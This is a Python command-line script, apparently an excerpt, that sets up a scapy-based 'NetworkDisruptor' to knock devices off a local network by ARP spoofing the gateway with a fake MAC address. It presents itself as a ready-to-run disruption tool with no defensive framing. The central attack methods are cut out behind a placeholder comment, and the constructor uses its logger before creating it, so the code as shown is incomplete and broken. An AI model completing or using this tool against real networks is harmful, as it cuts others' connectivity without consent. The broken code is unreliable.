import argparse
import platform
import subprocess
import sys
import time
import logging
import random
import re
from scapy.all import (
    Ether,
    ARP,
    sendp,
    conf,
    get_if_list,
    get_working_if,
    srp,
    getmacbyip,
    get_if_addr
)

class NetworkDisruptor:
    def __init__(self, fake_mac: str = None, gateway_ip: str = None, interface: str = None):
        if fake_mac and not self._is_valid_mac(fake_mac):
            self.logger.error(f"Invalid MAC address format: {fake_mac}")
            sys.exit(1)
            
        self.fake_mac = fake_mac or self._generate_private_mac()
        self.gateway_ip = gateway_ip or self._get_default_gateway()
        self.interface = interface or get_working_if()
        self.os_type = platform.system().lower()
        
        # Configure logging
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s'
        )
        self.logger = logging.getLogger(__name__)

    @staticmethod
    def _is_valid_mac(mac: str) -> bool:
        """Validate MAC address format."""
        mac_pattern = re.compile(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$')
        return bool(mac_pattern.match(mac))

    def _generate_private_mac(self) -> str:
        """Generate a modern privacy-preserving MAC address."""
        first_byte = 0x02
        random_bytes = [random.randint(0, 255) for _ in range(5)]
        mac_bytes = [first_byte] + random_bytes
        return ":".join([f"{b:02x}" for b in mac_bytes])

    # ... [rest of the class implementation remains the same] ...

def main():
    parser = argparse.ArgumentParser(
        description="Cross-platform network disruption using ARP spoofing"
    )
    parser.add_argument(
        "--fake-mac",
        help="Fake MAC address to use in ARP responses (optional, can be any valid MAC format. If not provided, a privacy-preserving MAC will be generated)",
        default=None
    )
    parser.add_argument(
        "--gateway-ip",
        help="Gateway IP address (optional, will be auto-detected if not provided)",
        default=None
    )
    parser.add_argument(
        "--interface",
        help="Network interface to use (optional)",
        default=None
    )
    
    args = parser.parse_args()
    
    disruptor = NetworkDisruptor(
        fake_mac=args.fake_mac,
        gateway_ip=args.gateway_ip,
        interface=args.interface
    )
    
    disruptor.disrupt_network()

if __name__ == "__main__":
    main()
